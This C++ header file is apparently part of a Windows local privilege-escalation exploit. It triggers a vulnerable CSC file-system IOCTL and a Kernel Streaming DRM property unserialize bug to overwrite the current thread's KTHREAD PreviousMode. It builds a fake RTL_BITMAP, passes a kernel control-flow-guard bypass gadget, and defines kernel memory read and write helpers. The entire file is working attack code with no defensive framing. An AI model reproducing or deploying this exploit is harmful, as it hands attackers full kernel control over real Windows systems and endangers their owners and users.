#pragma once

#define CSC_DEV_FCB_XXX_CONTROL_FILE            0x001401a3 // vuln ioctl

const GUID categories[] = { KSCATEGORY_DRM_DESCRAMBLE };
//
// Declare data structures related to the exploit
//
typedef struct _RTL_BITMAP
{
    DWORD SizeOfBitMap;
    PVOID Buffer;
}RTL_BITMAP, * PRTL_BITMAP;

#pragma pack(1)
typedef struct _EXPLOIT_DATA1
{
    PRTL_BITMAP  FakeBitmap;
}EXPLOIT_DATA1;

typedef struct _EXPLOIT_DATA2
{
    char pad[0x20];
    PVOID ptr_ArbitraryFunCall; // kCFG bypass gadget function, for example RtlSetAllBits
} EXPLOIT_DATA2;

bool ObtainKernelExploitCSC(uintptr_t TargetKThread)
{
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");

    if (!hNtdll)
    {
        printf("[-] Failed to obtain ntdll..\n");
        return false;
    }

    NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
    NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    NtFsControlFile = (PNtFsControlFile)GetProcAddress(hNtdll, "NtFsControlFile");

    if (!NtReadVirtualMemory || !NtWriteVirtualMemory || !NtFsControlFile)
    {
        printf("[-] Failed to obtain required functions..\n");
        return false;
    }

    HANDLE hHandle = NULL;

    UNICODE_STRING  ObjectName = { 0 };
    OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
    RtlInitUnicodeString(&ObjectName, L"\\Device\\Mup\\;Csc\\.\\.");
    InitializeObjectAttributes(&ObjectAttributes, &ObjectName, 0, NULL, NULL);

    IO_STATUS_BLOCK IoStatusBlock = { 0 };
    auto Status = NtCreateFile(&hHandle, SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, FILE_CREATE_TREE_CONNECTION, NULL, 0);
    if (!NT_SUCCESS(Status))
    {
        printf("[-] NtCreateFile failed with status = %08x\n", Status);
        return false;
    }

    Status = NtFsControlFile(hHandle, NULL, NULL, NULL, &IoStatusBlock, CSC_DEV_FCB_XXX_CONTROL_FILE, /*Vuln arg*/ reinterpret_cast<void*>(TargetKThread + KTHREAD_PreviousMode - 0x18), 0, NULL, 0);
    if (!NT_SUCCESS(Status))
    {
        printf("[-] ObtainKernelExploitCSC failed with status: %08x\n", Status);
        return false;
    }

    return true;
}

bool ObtainKernelExploitKS(uintptr_t TargetKThread)
{
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to load ntdll.dll\n");
        return false;
    }

     NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
     NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
     if (!NtReadVirtualMemory || !NtWriteVirtualMemory)
     {
         printf("[-] Failed to obtain required functions..\n");
         return false;
     }

    HANDLE hDrmDevice = NULL;

    HRESULT hr = KsOpenDefaultDevice(categories[0], GENERIC_READ | GENERIC_WRITE, &hDrmDevice);
    if (hr != NOERROR) {
        return false;
    }

    UCHAR InBuffer[sizeof(KSPROPERTY) + sizeof(EXPLOIT_DATA2)] = { 0 };
    UCHAR UnserializePropertySetRequest[sizeof(KSPROPERTY_SERIALHDR) + sizeof(KSPROPERTY_SERIAL) + sizeof(EXPLOIT_DATA1)] = { 0 };

    auto pInBufProperty = reinterpret_cast<KSPROPERTY*>(InBuffer);
    auto pInBufPropertyData = reinterpret_cast<EXPLOIT_DATA2*>(pInBufProperty + 1);

    auto pSerialHdr = reinterpret_cast<KSPROPERTY_SERIALHDR*>(UnserializePropertySetRequest);
    auto pSerial = reinterpret_cast<PKSPROPERTY_SERIAL>(pSerialHdr + 1);
    auto pOutBufPropertyData = reinterpret_cast<EXPLOIT_DATA1*>(pSerial + 1);

    pInBufProperty->Set = KSPROPSETID_DrmAudioStream;
    pInBufProperty->Flags = KSPROPERTY_TYPE_UNSERIALIZESET;
    pInBufProperty->Id = 0x0;
    pSerialHdr->PropertySet = KSPROPSETID_DrmAudioStream;
    pSerialHdr->Count = 1;
    pSerial->PropertyLength = sizeof(EXPLOIT_DATA1);
    pSerial->Id = 0x0;
    pSerial->PropTypeSet.Set = KSPROPSETID_DrmAudioStream;
    pSerial->PropTypeSet.Flags = 0x0;
    pSerial->PropTypeSet.Id = 0x45;
    pOutBufPropertyData->FakeBitmap = reinterpret_cast<PRTL_BITMAP>(AllocateBitmap(sizeof(RTL_BITMAP), reinterpret_cast<void*>(0x10000000)));
    pOutBufPropertyData->FakeBitmap->SizeOfBitMap = 0x20;
    pOutBufPropertyData->FakeBitmap->Buffer = reinterpret_cast<void*>(TargetKThread + KTHREAD_PreviousMode);
    pInBufPropertyData->ptr_ArbitraryFunCall = reinterpret_cast<void*>(LeakGadgetAddress("RtlClearAllBits"));

    // Trigger vulnerability
    BOOL Result = DeviceIoControl(hDrmDevice, IOCTL_KS_PROPERTY, pInBufProperty, sizeof(InBuffer), pSerialHdr, sizeof(UnserializePropertySetRequest), NULL, NULL);

    if (!Result) {
        printf("[-] ObtainKernelExploitKS failed with status: %08x\n", GetLastError());
        return false;
    }

    return true;
}

ULONG64 GetEProcessViaPID(ULONG TargetProcessId)
{
    HANDLE hHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, TargetProcessId);
    return GetKernelObject(TargetProcessId, hHandle);
}

ULONG64 GetCurrentEProcess()
{
    return GetEProcessViaPID(GetCurrentProcessId());
}

ULONG64 GetCurrentKThread()
{
    HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
    return GetKernelObject(GetCurrentProcessId(), hThread);
}

ULONG64 GetKThread(ULONG TargetProcessId, ULONG TargetThreadId)
{
    HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, TargetThreadId);
    return GetKernelObject(TargetProcessId, hThread);
}

bool ReadKernelMemory(PVOID Source, PVOID Buffer, ULONG Size)
{
    size_t cbNumOfBytesRead = 0;

    NTSTATUS Status = NtReadVirtualMemory(GetCurrentProcess(), Source, Buffer, Size, (PULONG)&cbNumOfBytesRead);
    if (!NT_SUCCESS(Status))
    {
        return false;
    }

    return true;
}
bool WriteKernelMemory(PVOID Source, PVOID Buffer, ULONG Size)
{
    size_t cbNumOfBytesWrite = 0;

    NTSTATUS Status = NtWriteVirtualMemory(GetCurrentProcess(), Source, &Buffer, Size, (PULONG)&cbNumOfBytesWrite);

    if (!NT_SUCCESS(Status))
    {
        return false;
    }
    return true;
}